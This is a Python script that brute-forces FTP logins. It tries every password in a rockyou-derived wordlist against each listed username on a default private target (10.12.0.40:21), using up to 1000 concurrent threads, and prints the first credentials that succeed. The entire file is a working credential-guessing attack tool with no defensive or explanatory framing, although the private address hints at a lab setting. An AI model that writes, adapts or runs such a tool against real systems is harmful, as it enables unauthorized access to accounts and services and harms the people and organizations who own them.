from concurrent.futures import ThreadPoolExecutor, as_completed
from ftplib import FTP
from itertools import islice
import time
class FTPBruteForce:
    def __init__(self, target_ip= "10.12.0.40", target_port= 21, max_threads= 1000,usernamesDictionary = "usernames50.txt",passwordsDictionary = "rockyou50.txt"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.max_threads = max_threads
        self.usernamesDictionary = usernamesDictionary
        self.passwordsDictionary = passwordsDictionary
        self.found_credentials = None
        
        
    def ftp_connect(self, username, password):
        ftp = FTP()
        try:
            ftp.connect(host=self.target_ip, port=self.target_port, timeout=5)
            ftp.login(user=username, passwd=password)
            ftp.quit()
            self.found_credentials = [username,password]
            return True
        except Exception as e:
            return None

    def check_passwords(self, username, passwords):
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(self.ftp_connect, username, passwd): passwd for passwd in passwords}
            for future in as_completed(futures):
                if future.result():
                    return futures[future]
        return None

    def read_lines(self,file, num_lines):
        lines = []
        for _ in range(num_lines):
            line = file.readline()
            if not line:
                break
            lines.append(line.strip())
        return lines

    def main(self):
        found_password = None
        usernames = []
        with open(self.usernamesDictionary, "r", encoding="utf-8", errors="ignore") as file:
            usernames = [line.strip() for line in file]
        with open(self.passwordsDictionary, "r", encoding="utf-8", errors="ignore") as file:
            for user in usernames:
                file.seek(0)
                lines = self.read_lines(file, self.max_threads)
                while lines:
                    print(f"Test {user} with all passwords")
                    found_password = self.check_passwords(user,lines)
                    if found_password:
                        return 1
                    lines = self.read_lines(file, self.max_threads)
            return 0

if __name__ == "__main__":
    ftpBruteForce = FTPBruteForce()
    ftpBruteForce.main()
    if ftpBruteForce.found_credentials is not None:
        print(f"User:{ftpBruteForce.found_credentials[0]}, Password: {ftpBruteForce.found_credentials[1]}")